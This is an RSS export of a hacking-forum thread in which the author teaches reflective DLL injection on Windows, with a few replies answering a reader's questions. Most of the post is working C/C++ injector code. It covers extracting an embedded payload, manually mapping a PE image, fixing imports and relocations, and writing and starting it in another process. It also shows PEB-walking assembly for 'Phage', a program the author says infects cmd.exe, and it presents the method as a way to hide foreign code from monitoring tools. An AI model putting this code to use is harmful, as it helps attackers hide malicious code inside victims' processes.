<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Reflective DLL Injection</title>
    <link>https://0x00sec.org/t/reflective-dll-injection/3080</link>
    <description>It&#39;s been a while since I wrote something related to my development projects, not to mention something that&#39;s malware-related. This was a concept that I devised (even though it already exists) while I was helping @fraq come up with ideas on stealth techniques on Windows machines. I&#39;ve now completed a bare minimum proof-of-concept, dubbed `Lynx`, and will proceed to present its inner workings at the code level and then demonstrate it. To keep this article short and on topic, I will not be going over the details which will be mentioned in the pre-requisite list.

#### Disclaimer

The content provided is based entirely off my own research so if there is any incorrect information, I would like to sincerely apologise. If there is any feedback, please inform me and I will get to it as soon as I am able.

#### Author Assigned Level: -
#### Community Assigned Level:
[poll type=regular]
* Newbie
* Wannabe
* Hacker
* Wizard
* Guru
[/poll]

#### Required Skills

To completely understand the content of this article, the following lists pre-requisite knowledge:

* C/C++
* Windows API
* Virtual memory
* PE file format
* Dynamic-link Libraries
 

-----
# DLL Injection

What is DLL injection? DLL injection simply refers to the (forced) _injection_ of a DLL into the space of another process and then execution of its code. The usual technique of performing this can represented by the following snippet of code:

```cpp
VOID InjectDll(HANDLE hProcess, LPCSTR lpszDllPath) {
	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(hProcess, lpBaseAddress, lpszDllPath, dwDllPathLen, &amp;dwWritten);

	HMODULE hModule = GetModuleHandle(&quot;kernel32.dll&quot;);

	LPVOID lpStartAddress = GetProcAddress(hModule, &quot;LoadLibraryA&quot;);

	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpBaseAddress, 0, NULL);
}
```

The first step is to allocate an area of memory in the virtual memory space of the target process which can be done with the `VirtualAllocEx` function, specifying the handle to the process. We can then use `WriteProcessMemory` to write data to the process by using the full path to the DLL payload. To execute the code, all we are required to do is to retrieve the `LoadLibrary` function from the `kernel32` module and then call `CreateRemoteThread` to execute the `LoadLibrary` function within the target process to force load the DLL payload as a library. As a result of this loading, it will immediately execute the DLL&#39;s `DllMain` entry point with the `DLL_PROCESS_ATTACH` reason.

Here is the example DLL code that I will be using for the demonstration to represent malicious code:

```cpp
#include &lt;Windows.h&gt;

BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved) {
	::MessageBox(NULL, L&quot;Hello world!&quot;, L&quot;Test DLL&quot;, MB_OK);

	return TRUE;
}
```

### Reflective DLL Injection

What makes _Reflective DLL Injection_ different? Recall the previous DLL injection code and that the source of the DLL is obtained via its full path on disk. Because of this, it is not considered a very stealthy approach and also has an external dependency which may be problematic should it ever be separated. These issues can be addressed by using _Reflective DLL Injection_ which allows the sourcing of the DLL in the form of its raw data. To be able to inject the data into the target process, we must manually parse and map the binary into the virtual memory as the Windows image loader would do when calling the `LoadLibrary` function from before. So let&#39;s find out how this can be done.


----------

# Reflective DLL Injection Process

Here is a brief summary of the stages that will be undergone to map a DLL into an external process:

1. The DLL payload must be retrieved,
2. The DLL must then be mapped into memory,
3. After mapping it to memory, its import table must be rebuilt,
4. The base relocation table must be parsed to fix addresses due to the potential difference in image base,
5. The mapped DLL is then written into the target process.

## Extracting From Resources

To keep the DLL together with the injector as a single entity, we can take advantage of the PE format&#39;s resource section. 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/f77d6cb6f632c8dde7bbbe317e32774842946883.JPG&quot; width=&quot;690&quot; height=&quot;378&quot;&gt;

Extracting the DLL&#39;s raw binary is a trivial task which can be performed by using the resource API. Before extracting, we must check if a DLL exists in the resources like so:

```cpp
BOOL CALLBACK EnumResNameProc(HMODULE hModule, LPCWSTR lpszType, LPWSTR lpszName, LONG_PTR lParam) {
	HRSRC *h = reinterpret_cast&lt;HRSRC *&gt;(lParam);
	HRSRC hRsrc = ::FindResource(hModule, lpszName, lpszType);
	if (!hRsrc) return TRUE;
	// if found, stop enumerating
	else {
		*h = hRsrc;
		return FALSE;
	}

	return TRUE;
}

bool Injector::HasPayload() {
	// get own module
	HMODULE hModule = ::GetModuleHandle(NULL);
	if (!hModule) return false;

	// enumerate resources and select &quot;PAYLOAD&quot; type
	HRSRC hRsrc = NULL;
	if (!::EnumResourceNames(hModule, L&quot;PAYLOAD&quot;, EnumResNameProc, reinterpret_cast&lt;LPARAM&gt;(&amp;hRsrc)) &amp;&amp; GetLastError() != ERROR_RESOURCE_ENUM_USER_STOP)
		return false;	// fail if no PAYLOAD resources are found

	if (!hRsrc) return false;

	this-&gt;payload-&gt;hResPayload = hRsrc;

	return true;
}
```

The above code will enumerate all of the resources of type `PAYLOAD` (there should only be one) and if it is successful, it will retrieve a handle to the resource by calling `FindResource`. Once we&#39;ve obtained the handle, we can get a pointer to the raw binary data and copy it into memory using the following:

```cpp
bool Injector::LoadFromResource() {
	// get resource size
	DWORD dwSize = ::SizeofResource(::GetModuleHandle(NULL), this-&gt;payload-&gt;hResPayload);
	// load resource
	HGLOBAL hResData = ::LoadResource(NULL, this-&gt;payload-&gt;hResPayload);
	if (hResData) {
		// get pointer to data
		LPVOID lpPayload = ::LockResource(hResData);
		if (lpPayload) {
			// save to vector
			if (MemoryMapPayload(lpPayload))
				return true;
		}
	}

	return false;
}
```

Keep in mind that after calling `LockResource`, the pointer to the DLL resource is read-only and the data is in its _disk form_, meaning that the offsets are all file offsets, not memory offsets. 

## Mapping to Memory

We will need to convert it into its _memory form_ for further processing which we can do by parsing its structures and mapping it to a memory space. The following code will achieve this:

```cpp
bool Injector::MemoryMapPayload(LPVOID lpPayload) {
	// get DOS header
	PIMAGE_DOS_HEADER pidh = reinterpret_cast&lt;PIMAGE_DOS_HEADER&gt;(lpPayload);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = reinterpret_cast&lt;PIMAGE_NT_HEADERS&gt;(reinterpret_cast&lt;DWORD&gt;(lpPayload) + pidh-&gt;e_lfanew);

    // get handle to mapping
	HANDLE hMapping = ::CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, pinh-&gt;OptionalHeader.SizeOfImage, NULL);
	if (hMapping) {
        // get a pointer to the mapped address
		LPVOID lpMapping = ::MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
		if (lpMapping) {
			// map payload to memory
			// copy headers
			::CopyMemory(lpMapping, lpPayload, pinh-&gt;OptionalHeader.SizeOfHeaders);
			// copy sections
			for (int i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
				PIMAGE_SECTION_HEADER pish = reinterpret_cast&lt;PIMAGE_SECTION_HEADER&gt;(reinterpret_cast&lt;DWORD&gt;(lpPayload) + pidh-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
				::CopyMemory(reinterpret_cast&lt;LPVOID&gt;(reinterpret_cast&lt;DWORD&gt;(lpMapping) + pish-&gt;VirtualAddress), reinterpret_cast&lt;LPVOID&gt;(reinterpret_cast&lt;DWORD&gt;(lpPayload) + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData);
			}
			this-&gt;vPayloadData = std::vector&lt;BYTE&gt;(reinterpret_cast&lt;LPBYTE&gt;(lpMapping), reinterpret_cast&lt;LPBYTE&gt;(lpMapping) + pinh-&gt;OptionalHeader.SizeOfImage);
			::UnmapViewOfFile(lpMapping);
			::CloseHandle(hMapping);
			return true;
		}
		::CloseHandle(hMapping);
	}

	return false;
}
```

Here, a segment of memory is mapped so that we can transform the binary into its memory-mapped counterpart. The sections are first copied into memory as they are the same as a disk object and a memory image. Next, the section headers are enumerated to gather the virtual offsets of the sections themselves which is used to correctly insert the sections into their correct regions. Once the transformation is complete, we can simply store it and clean up the mapped memory.

## Rebuilding and Injecting the DLL

Before we rebuild the DLL, we must first check if the target process exists, and if it does, retrieve the handle to it. We can do this by enumerating all of the running processes and then comparing their names:

```cpp
bool Injector::GetProcess() {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;pe32)) {
		while (Process32Next(hSnapshot, &amp;pe32)) {
            // check process name
			if (wcsicmp(pe32.szExeFile, this-&gt;szProcessName.c_str()) == 0) {
				// get handle to process
				HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				::CloseHandle(hSnapshot);
                // save handle
				this-&gt;payload-&gt;hProcess = hProcess;
				return true;
			}
		}
	} else
		return ::CloseHandle(hSnapshot), false;

	return false;
}
```

We are now able to check if we can allocate some memory in the target process&#39;s address space. To achieve this, we can use the `VirtualAllocEx` function, specifying the handle to the process and the size of the image:

```cpp
	// allocate space in target process
	this-&gt;payload-&gt;lpAddress = ::VirtualAllocEx(this-&gt;payload-&gt;hProcess, NULL, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!this-&gt;payload-&gt;lpAddress)
		return Debug(L&quot;Failed to allocate space: %lu\n&quot;, GetLastError()), false;
```

Once we&#39;ve confirmed that there is available space, we can move onto rebuilding the DLL. Firstly, rebuilding the import table:

```cpp
bool Injector::RebuildImportTable(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh) {
	// parse import table if size != 0
	if (pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		// https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
		PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast&lt;PIMAGE_IMPORT_DESCRIPTOR&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		// Walk until you reached an empty IMAGE_IMPORT_DESCRIPTOR
		while (pImportDescriptor-&gt;Name != NULL) {
			// get the name of each DLL
			LPSTR lpLibrary = reinterpret_cast&lt;PCHAR&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;Name);

			HMODULE hLibModule = ::LoadLibraryA(lpLibrary);

			PIMAGE_THUNK_DATA nameRef = reinterpret_cast&lt;PIMAGE_THUNK_DATA&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;Characteristics);
			PIMAGE_THUNK_DATA symbolRef = reinterpret_cast&lt;PIMAGE_THUNK_DATA&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;FirstThunk);
			PIMAGE_THUNK_DATA lpThunk = reinterpret_cast&lt;PIMAGE_THUNK_DATA&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pImportDescriptor-&gt;FirstThunk);
			for (; nameRef-&gt;u1.AddressOfData; nameRef++, symbolRef++, lpThunk++) {
				// fix addresses
				// check if import by ordinal
				if (nameRef-&gt;u1.AddressOfData &amp; IMAGE_ORDINAL_FLAG)
					*(FARPROC *)lpThunk = ::GetProcAddress(hLibModule, MAKEINTRESOURCEA(nameRef-&gt;u1.AddressOfData));
				else {
					PIMAGE_IMPORT_BY_NAME thunkData = reinterpret_cast&lt;PIMAGE_IMPORT_BY_NAME&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + nameRef-&gt;u1.AddressOfData);
					*(FARPROC *)lpThunk = ::GetProcAddress(hLibModule, reinterpret_cast&lt;LPCSTR&gt;(&amp;thunkData-&gt;Name));
				}
			}
			::FreeLibrary(hLibModule);
			// advance to next IMAGE_IMPORT_DESCRIPTOR
			pImportDescriptor++;
		}
	}

	return true;
}
```

Basically, the import table is obtained via the Optional Header structure of the PE format and it is _walked_, retrieving the imported function names and then overwriting the `FirstThunk` addresses. This is done by first getting the library containing the function using `LoadLibrary` and then calling `GetProcAddress` to get the proper address.

The next step is to relocate the address using the Relocation Table. The delta of the actual allocated base address in the target process in conjunction with the original base address is calculated with a simple subtraction:

```cpp
DWORD dwDelta = reinterpret_cast&lt;DWORD&gt;(this-&gt;payload-&gt;lpAddress) - pinh-&gt;OptionalHeader.ImageBase;
```

Similar to the import table, the data in the relocation table is _walked_ and applies the appropriate offset to the provided addresses using the calculated delta:

```cpp
bool Injector::BaseRelocate(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh, DWORD dwDelta) {
	IMAGE_BASE_RELOCATION *r = reinterpret_cast&lt;IMAGE_BASE_RELOCATION *&gt;(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); //The address of the first I_B_R struct 
	IMAGE_BASE_RELOCATION *r_end = reinterpret_cast&lt;IMAGE_BASE_RELOCATION *&gt;(reinterpret_cast&lt;DWORD_PTR&gt;(r) + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION)); //The addr of the last
	for (; r &lt; r_end; r = reinterpret_cast&lt;IMAGE_BASE_RELOCATION *&gt;(reinterpret_cast&lt;DWORD_PTR&gt;(r) + r-&gt;SizeOfBlock)) {
		WORD *reloc_item = reinterpret_cast&lt;WORD *&gt;(r + 1);
		DWORD num_items = (r-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (DWORD i = 0; i &lt; num_items; ++i, ++reloc_item) {
			switch (*reloc_item &gt;&gt; 12) {
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*(DWORD_PTR *)(reinterpret_cast&lt;DWORD&gt;(lpBaseAddress) + r-&gt;VirtualAddress + (*reloc_item &amp; 0xFFF)) += dwDelta;
					break;
				default:
					return false;
			}
		}
	}

	return true;
}
```

Now that we&#39;ve rebuilt what needs to be rebuilt and have allocated memory in the external process, we can just simply write the entire binary in using `WriteProcessMemory`:

```cpp
if (!::WriteProcessMemory(this-&gt;payload-&gt;hProcess, this-&gt;payload-&gt;lpAddress, this-&gt;vPayloadData.data(), pinh-&gt;OptionalHeader.SizeOfImage, NULL))
		return Debug(L&quot;Failed write payload: %lu\n&quot;, GetLastError()), false;
```

Easy, right?

## Executing the DLL

Execution is almost the same as normal DLL injection, using a call to `CreateRemoteThread`. The only difference here is that we will not be using `LoadLibrary` but instead, we will use the address of entry point value directly of the DLL which should be the `DllMain` entry point.

```cpp
// entry point is the base address + the AddressOfEntryPoint value
this-&gt;payload-&gt;dwEntryPoint = reinterpret_cast&lt;DWORD&gt;(this-&gt;payload-&gt;lpAddress) + pinh-&gt;OptionalHeader.AddressOfEntryPoint;

HANDLE hThread = ::CreateRemoteThread(this-&gt;payload-&gt;hProcess, NULL, 0, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(payload-&gt;dwEntryPoint), NULL, 0, NULL);
```

And that&#39;s it!

----------

# Demonstration

In this demonstration, I will be using `putty.exe` because I can and I can&#39;t use `explorer.exe` because it is a 64-bit process versus my 32-bit injector and DLL. Also, I don&#39;t have a 32-bit VM anywhere. I will also be using the _Process Hacker_ monitoring tool to view any forensic evidence as a result of the DLL injection.

## Normal DLL Injection

Here is the result of the normal DLL injection method:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/a13cbf10fed4d55ae48a25d6152d4ca994b95a73.JPG&quot; width=&quot;690&quot; height=&quot;372&quot;&gt;

We can see that it shows up clearly on the list of loaded modules and is a very obvious giveaway that there is foreign code in the affected process.

## Reflective DLL Injection

Let&#39;s now check out the reflective DLL injection method:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/4646eff4731dbab40c690c488c89e1d2d411459a.JPG&quot; width=&quot;690&quot; height=&quot;371&quot;&gt;

And here, there is no name for that block of memory space. Besides the `RWX` permissions (which can easily be fixed but remember that this is a PoC), there are no obvious signs that there exists any foreign code! Pretty neat, huh?

----------

# Addressing Some Issues

Just a little addition to the article, there are problems which may be encountered when executing in the space of another process. While this example DLL may work on many processes, it will only be guaranteed to work on those which have imported the `user32.dll` library as the (only) function it uses `MessageBox`. Many GUI applications on Windows import `user32.dll` as a requirement to be able to create part of the graphical components.

Instead of using the example DLL, say, we wanted to use something more complex that depends on multiple libraries which may or may not be imported by the target process, for example, a console application. In such an event, execution of the non-existent function (within the space of the target process) will cause some access violation error with a very likely chance as it could be attempting to execute non-executable memory. The process will inevitably crash. So how could we solve this issue?

## Dynamically Retrieving Functions

One of the solutions is to obtain the API before executing the main payload which can be done by using the classic `LoadLibrary` and `GetProcAddress` combination to load libraries into the process space and then getting the addresses of a desired functions. I will quickly explain it because I&#39;ve already detailed it in another [thread](https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043). Essentially, we find the image base of the `kernel32.dll` module which is always loaded in every process due to some crucial functions required to initialise the program. Once a handle has been gained, the export table is found and then walked where each name of every exported function is compared which when a needed function is found, so can the address of the function, i.e. `LoadLibrary` and `GetProcAddress`. With these two function addresses present, it is possible to then load more libraries into the process and find the addresses of any desired function that exists in the WinAPI. Let&#39;s see how this is done.

```c
void InitialiseFunctions(void) {
	HMODULE hKernel32Mod = NULL;
	__asm {
		pushad
		mov		eax, fs:[0x30]
		mov		eax, [eax + 0x0C]
		mov		eax, [eax + 0x14]
		mov		eax, [eax]
		mov		eax, [eax]
		mov		eax, [eax + 0x10]
		mov		hKernel32Mod, eax
		popad
	}

	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh-&gt;e_lfanew);
	// find eat
	PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// find functions
	LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfFunctions);
	LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfNames);
	LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfNameOrdinals);

	// loop through all names of functions and select LoadLibrary and GetProcAddress
	for (int i = 0; i &lt; pied-&gt;NumberOfNames; i++) {
		LPCSTR lpName = (LPCSTR)((DWORD)hKernel32Mod + dwNames[i]);
		if (!strcmp(lpName, &quot;LoadLibraryA&quot;))
			fnLoadLibraryA = (pfnLoadLibraryA)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
		else if (!strcmp(lpName, &quot;GetProcAddress&quot;))
			fnGetProcAddress = (pfnGetProcAddress)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
	}

	// load libraries
	HMODULE hUser32Mod = fnLoadLibraryA(&quot;user32.dll&quot;);
	HMODULE hShlwapiMod = fnLoadLibraryA(&quot;shlwapi.dll&quot;);

	// kernel32
	// functions to reinfect another process
	fnCreateToolhelp32Snapshot = (pfnCreateToolhelp32Snapshot)fnGetProcAddress(hKernel32Mod, &quot;CreateToolhelp32Snapshot&quot;);
	fnProcess32FirstW = (pfnProcess32FirstW)fnGetProcAddress(hKernel32Mod, &quot;Process32FirstW&quot;);
	fnProcess32NextW = (pfnProcess32NextW)fnGetProcAddress(hKernel32Mod, &quot;Process32NextW&quot;);
	fnOpenProcess = (pfnOpenProcess)fnGetProcAddress(hKernel32Mod, &quot;OpenProcess&quot;);
	fnCloseHandle = (pfnCloseHandle)fnGetProcAddress(hKernel32Mod, &quot;CloseHandle&quot;);
	fnIsWow64Process = (pfnIsWow64Process)fnGetProcAddress(hKernel32Mod, &quot;IsWow64Process&quot;);
	fnGetProcessHeap = (pfnGetProcessHeap)fnGetProcAddress(hKernel32Mod, &quot;GetProcessHeap&quot;);
	fnHeapAlloc = (pfnHeapAlloc)fnGetProcAddress(hKernel32Mod, &quot;HeapAlloc&quot;);
	fnGetModuleFileNameW = (pfnGetModuleFileNameW)fnGetProcAddress(hKernel32Mod, &quot;GetModuleFileNameW&quot;);
	fnVirtualAllocEx = (pfnVirtualAllocEx)fnGetProcAddress(hKernel32Mod, &quot;VirtualAllocEx&quot;);
	fnWriteProcessMemory = (pfnWriteProcessMemory)fnGetProcAddress(hKernel32Mod, &quot;WriteProcessMemory&quot;);
	fnCreateRemoteThread = (pfnCreateRemoteThread)fnGetProcAddress(hKernel32Mod, &quot;CreateRemoteThread&quot;);
	fnHeapFree = (pfnHeapFree)fnGetProcAddress(hKernel32Mod, &quot;HeapFree&quot;);
	fnGetLastError = (pfnGetLastError)fnGetProcAddress(hKernel32Mod, &quot;fnGetLastError&quot;);
	fnExitProcess = (pfnExitProcess)fnGetProcAddress(hKernel32Mod, &quot;ExitProcess&quot;);
	fnGetNativeSystemInfo = (pfnGetNativeSystemInfo)fnGetProcAddress(hKernel32Mod, &quot;GetNativeSystemInfo&quot;);
	// functions for payload
	fnWaitForSingleObject = (pfnWaitForSingleObject)fnGetProcAddress(hKernel32Mod, &quot;WaitForSingleObject&quot;);
	fnGetModuleHandleW = (pfnGetModuleHandleW)fnGetProcAddress(hKernel32Mod, &quot;GetModuleHandleW&quot;);
	fnCreateProcessW = (pfnCreateProcessW)fnGetProcAddress(hKernel32Mod, &quot;CreateProcessW&quot;);

	// shwlapi
	fnStrStrIW = (pfnStrStrIW)fnGetProcAddress(hShlwapiMod, &quot;StrStrIW&quot;);

	// user32
	// debugging functions
#ifdef _DEBUG
	fnwvsprintfW = (pfnwvsprintfW)fnGetProcAddress(hUser32Mod, &quot;wvsprintfW&quot;);
	fnMessageBoxW = (pfnMessageBoxW)fnGetProcAddress(hUser32Mod, &quot;MessageBoxW&quot;);
#endif // _DEBUG

}
```

The inline assembly at the start represents the procedure to get the image base of the `kernel32.dll` library. It finds the PEB of the process, then iterates through a list of memory modules until it hits the second one. Note that this will always be in the same order as it is called the `InMemoryOrderModuleList` member, starting with `ntdll.dll` first, then `kernel32.dll`, then the main process itself. The `DllBase` member is at a `0x10` offset from the beginning of the data structure defined by the entry:

```
typedef struct _LDR_DATA_TABLE_ENTRY {
    // unnecessary members omitted
    LIST_ENTRY InMemoryOrderLinks;    // offset 0; size 8
    PVOID Reserved2[2];               // offset 8; size 8
    PVOID DllBase;                    // offset 16
    // unnecessary members omitted
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

After this, the export table address is found and pointed to by `pied` which is then used to find the pointer to the addresses which hold the names, ordinals and function addresses. We can use a loop to iterate through all the functions (they are in alphabetical order) to match and retrieve `LoadLibrary` and `GetProcAddress`. These two functions are then used to load the required libraries and their functions.

Now we can execute the payload.

## Demonstration

The following demonstration shows another PoC program which I named `Phage` which is an executable that uses the reflective DLL injection style method to infect another process (hence does not rely on a DLL). Here I have chosen to infect `cmd.exe` under 32-bit Windows 7 (to prove the functioning dynamically-retrieved API) and disable a particular feature.

Let&#39;s look at the process&#39;s initial memory space and what libraries are present by default:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/53087b3980379ced2dec5f7100ad8e911497e523.JPG&quot; width=&quot;690&quot; height=&quot;360&quot;&gt;

and then here it is infected:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/dc19e3713c8a4909620190eafc3e58f5ba0ca474.JPG&quot; width=&quot;690&quot; height=&quot;368&quot;&gt;

Firstly, `Phage` has placed itself in the memory address `0x1580000`. We can also see at the bottom of the list of stacked DLLs there is the loaded `Shlwapi.dll` library which was defined in the above code. The imported function `StrStrIW` is used in the payload to filter out certain parameters under a feature which I have impaired as seen here:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/a0620628f269f6967f2742a68bf85be3f18b4afc.JPG&quot; width=&quot;690&quot; height=&quot;461&quot;&gt;

Whenever the infected process tries to start a process which has a `.exe` in its name, it will be denied.

----------


# Conclusion

Reflective DLL injection is just the emulation of the Windows image loader to map and execute a DLL into another process&#39;s address space which can remain hidden due to the lack of obvious information provided by monitoring tools.

`LoadLibrary` versus manual injection? They both have their advantages and disadvantages. For example, `LoadLibrary` provides a much more elegant injection that properly executes the `DllMain` entry point with the correct arguments. On the other hand, I&#39;ve no idea how it would be possible using what I did which means that it may not be possible to utilise the `fdwReason` parameter to properly execute code under certain circumstances and hence, may fire off code multiple times undesirably. There might be a way to do it but I do not know of it.

As I&#39;ve stated previously, the code is bare minimum working and there may be a lot more things I&#39;d need to add to support DLLs with slightly different structures. I&#39;ve also opted to create a GUI for it too but further development of the code might not be considered for the time being. I will upload it to my Gitlab [here](https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Lynx)!

Thanks for reading and I hope you&#39;ve learned something!

-- _dtm_</description>
    
    <lastBuildDate>Fri, 22 Dec 2017 00:42:12 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/reflective-dll-injection/3080.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/11</link>
        <pubDate>Fri, 22 Dec 2017 00:57:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-11</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/10</link>
        <pubDate>Fri, 22 Dec 2017 00:42:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-10</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/9</link>
        <pubDate>Mon, 11 Dec 2017 21:40:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-9</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[HappyHacking]]></dc:creator>
        <description><![CDATA[
            <p>Thx for the reply.<img src="https://0x00sec.org/images/emoji/twitter/slightly_smiling_face.png?v=9" title=":slightly_smiling_face:" class="emoji" alt=":slightly_smiling_face:"></p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/8</link>
        <pubDate>Sun, 10 Dec 2017 22:39:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-8</guid>
        <source url="https://0x00sec.org/t/reflective-dll-injection/3080.rss">Reflective DLL Injection</source>
      </item>
      <item>
        <title>Reflective DLL Injection</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Hello there! We’re all noobs at hacking here all looking to learn so I’ll try to answer your questions to the best of my ability.</p>
<aside class="quote no-group" data-username="HappyHacking" data-post="6" data-topic="3080">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/happyhacking/40/5878_2.png" class="avatar"> HappyHacking:</div>
<blockquote>
<p>Why do you rebuild import table in injector’s address?</p>
</blockquote>
</aside>
<p>The reason I chose to rebuild the import table there is because it is much simpler compared to constantly having to use <code>ReadProcessMemory</code> to query the import table and then use <code>WriteProcessMemory</code> to fix the addresses.</p>
<aside class="quote no-group" data-username="HappyHacking" data-post="6" data-topic="3080">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/happyhacking/40/5878_2.png" class="avatar"> HappyHacking:</div>
<blockquote>
<p>First, some dlls are not loaded in target process.<br>
Second,  some dlls(maybe not system dll but something like directx or other public dll) are not loaded at same imagebase in target’s address.</p>
</blockquote>
</aside>
<p>Yes, I can understand that some DLLs may not be loaded into the target process however, since this is a basic implementation designed purely to show an example, it was not included here. If you wish to have these features, you will need to create them yourself.</p>
<p>The rest of the issues you discuss in your post can be remedied using another approach which is to first inject a bootstrap-style shellcode into the target process along with the payload. This will then perform the initialisation similar to what has been demonstrated here. If you’re keen on developing this, we would love to see it posted here. <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/reflective-dll-injection/3080/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/reflective-dll-injection/3080/7</link>
        <pubDate>Sun, 10 Dec 2017 04:40:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3080-7</guid>
